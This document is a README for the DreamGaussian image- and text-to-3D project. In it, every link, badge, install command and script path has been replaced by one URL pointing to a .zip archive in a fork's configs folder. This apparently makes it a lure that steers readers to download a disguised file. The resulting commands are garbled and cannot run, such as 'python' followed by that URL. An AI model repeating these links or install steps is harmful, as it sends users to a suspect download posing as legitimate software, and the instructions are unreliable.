# DreamGaussian

This repository contains the official implementation for [DreamGaussian: Generative Gaussian Splatting for Efficient 3D Content Creation](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip).

### [Project Page](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip) | [Arxiv](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)


https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip

### [Colab demo](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)
* Image-to-3D: [![Open In Colab](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)
* Text-to-3D: [![Open In Colab](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)

### [Gradio demo](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)
* Image-to-3D: <a href="https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip"><img src="https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip%F0%9F%A4%97%20Gradio%20Demo-Huggingface-orange"></a>

## Install
```bash
pip install -r https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip

# a modified gaussian splatting (+ depth, alpha rendering)
git clone --recursive https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip
pip install ./diff-gaussian-rasterization

# simple-knn
pip install ./simple-knn

# nvdiffrast
pip install git+https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip

# kiuikit
pip install git+https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip
```

Tested on:
* Ubuntu 22 with torch 1.12 & CUDA 11.6 on a V100.
* Windows 10 with torch 2.1 & CUDA 12.1 on a 3070.

## Usage

Image-to-3D:
```bash
### preprocess
# background removal and recentering, save rgba at 256x256
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip

# save at a larger resolution
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --size 512

# process all jpg images under a dir
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip data

### training gaussian stage
# train 500 iters (~1min) and export ckpt & coarse_mesh to logs
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name

# gui mode (supports visualizing training)
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name gui=True

# load and visualize a saved ckpt
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip gui=True

# use an estimated elevation angle if image is not front-view (e.g., common looking-down image can use -30)
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name elevation=-30

### training mesh stage
# auto load coarse_mesh and refine 50 iters (~1min), export fine_mesh to logs
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name

# specify coarse mesh path explicity
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip

# gui mode
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name gui=True

# export glb instead of obj
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name mesh_format=glb

### visualization
# gui for visualizing mesh
python -m https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip

# save 360 degree video of mesh (can run without gui)
python -m https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --save_video https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --wogui

# save 8 view images of mesh (can run without gui)
python -m https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --save images/name/ --wogui

### evaluation of CLIP-similarity
python -m https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip
```
Please check `https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip` for more options.

Text-to-3D:
```bash
### training gaussian stage
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip prompt="a photo of an icecream" save_path=icecream

### training mesh stage
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --config https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip prompt="a photo of an icecream" save_path=icecream
```
Please check `https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip` for more options.

Helper scripts:
```bash
# run all image samples (*https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip) in ./data
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --dir ./data --gpu 0

# run all text samples (hardcoded in https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --gpu 0

# export all ./logs/*.obj to mp4 in ./videos
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip --dir ./logs
```

Gradio Demo:
```bash
python https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip
```

## Acknowledgement

This work is built on many amazing research works and open-source projects, thanks a lot to all the authors for sharing!

* [gaussian-splatting](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip) and [diff-gaussian-rasterization](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)
* [threestudio](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)
* [nvdiffrast](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)
* [dearpygui](https://raw.githubusercontent.com/Meorny/dreamgaussianFork/main/configs/dreamgaussian_Fork_v3.2.zip)

## Citation

```
@article{tang2023dreamgaussian,
  title={DreamGaussian: Generative Gaussian Splatting for Efficient 3D Content Creation},
  author={Tang, Jiaxiang and Ren, Jiawei and Zhou, Hang and Liu, Ziwei and Zeng, Gang},
  journal={arXiv preprint arXiv:2309.16653},
  year={2023}
}
```
